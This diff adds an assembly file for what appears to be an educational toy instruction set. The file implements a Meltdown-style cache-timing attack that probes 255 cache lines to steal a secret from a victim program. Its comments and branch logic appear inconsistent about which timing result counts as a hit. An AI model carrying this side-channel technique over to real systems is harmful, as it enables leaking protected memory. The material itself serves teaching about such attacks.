@@ -1,0 +1,35 @@
+;main
+
+/* This attack attempts to steal the secret from meltdown_victim.rrisc */
+
+/* Step 0, initialize a loop to check all 255 possible cache locations */
+copy 0x2000, R0     /* R0 = Base Address */
+copy 0xff, R1       /* R1 = Loop Iterator */
+
+label loop_start
+
+/* Step 1, flush the address */
+add R0, R1, R2
+flush R2
+
+/* Step 2, have the helper place the secret */
+exec helper
+nop 50
+
+/* Step 3, time the access to the address */
+cycletime R3
+load R2, R4
+cycletime R5
+
+/* Step 4, if timing was fast we failed */
+sub R5, R3, R6      /* R6 = num of cycles to read */
+sub R6, 0x3, R6       /* R6 = 0 if there was a cache load */
+jmpifnotzero R6, exit_loop
+
+/* Step 5, if failure, check next address */
+sub R1, 1, R1
+jmpifnotzero R1, loop_start
+
+label exit_loop
+checksecret R1
+ret
